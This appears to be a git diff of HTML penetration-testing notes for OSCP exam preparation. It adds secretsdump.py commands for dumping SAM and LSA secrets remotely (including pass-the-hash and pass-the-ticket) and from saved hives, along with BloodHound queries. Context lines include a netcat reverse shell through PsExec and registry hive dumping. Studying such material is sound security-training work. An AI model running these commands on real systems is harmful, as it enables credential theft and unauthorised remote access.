@@ -194,6 +194,14 @@
 <li><a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/tree/master">Report Maker</a></li>
 </ul>
 <h3 id="random-things"><a class="header" href="#random-things">Random things</a></h3>
+<h3 id="oscp-proof"><a class="header" href="#oscp-proof">OSCP Proof</a></h3>
+<pre><code># Don't forget:
+
+whoami &amp;&amp; ipconfig &amp;&amp; type proof.txt
+
+whoami &amp;&amp; ifconfig &amp;&amp; cat proof.txt
+
+</code></pre>
 <h3 id="dont-forget-to-search-files"><a class="header" href="#dont-forget-to-search-files">Don't forget to search files</a></h3>
 <pre><code>Remember if you come across random files you can use 'exiftool' on them, might get some usernames.
 
@@ -9400,6 +9408,7 @@ PS&gt; .\PsExec.exe -accepteula -u USER -p PASS nc.exe IP PORT -e cmd.exe
 <pre><code>powershell.exe -exec bypass -Command "&amp; {Import-Module .\Invoke-PowerDump.ps1; Invoke-PowerDump}"
 </code></pre>
 <h3 id="manual-1"><a class="header" href="#manual-1">Manual</a></h3>
+<p>https://www.thehacker.recipes/a-d/movement/credentials/dumping/sam-and-lsa-secrets</p>
 <pre><code># actual location
 C:\Windows\System32\config\SAM
 C:\Windows\System32\config\SECURITY
@@ -9415,6 +9424,24 @@ reg save hklm\security c:\Users\Public\ksecurity
 # on kali
 samdump2 ksystem ksam
 impacket-secrectsdump -sam ksam -security ksecurity -system ksystem LOCAL
+
+# Remote dumping of SAM &amp; LSA secrets
+secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
+
+# Remote dumping of SAM &amp; LSA secrets (pass-the-hash)
+secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
+
+# Remote dumping of SAM &amp; LSA secrets (pass-the-ticket)
+secretsdump.py -k 'DOMAIN/USER@TARGET'
+
+# Offline dumping of LSA secrets from exported hives
+secretsdump.py -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
+
+# Offline dumping of SAM secrets from exported hives
+secretsdump.py -sam '/path/to/sam.save' -system '/path/to/system.save' LOCAL
+
+# Offline dumping of SAM &amp; LSA secrets from exported hives
+secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
 </code></pre>
 <h3 id="putty"><a class="header" href="#putty">Putty</a></h3>
 <p>https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#files-and-registry-credentials
@@ -10189,7 +10216,11 @@ bloodhound
 bloodhound-python -u enox -p california -ns $ip -d heist.offsec -c all
 </code></pre>
 <h4 id="custom-queries"><a class="header" href="#custom-queries">Custom Queries</a></h4>
-<pre><code>Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.
+<pre><code>MATCH (m:Computer) RETURN m
+MATCH (m:User) RETURN m
+MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p
+
+Replace the `customqueries.json` with one of the below files to update the custom queries within Bloodhound. Remember to restart Bloodhound after changing the JSON file.
 
 **Locate custom queries file**
 
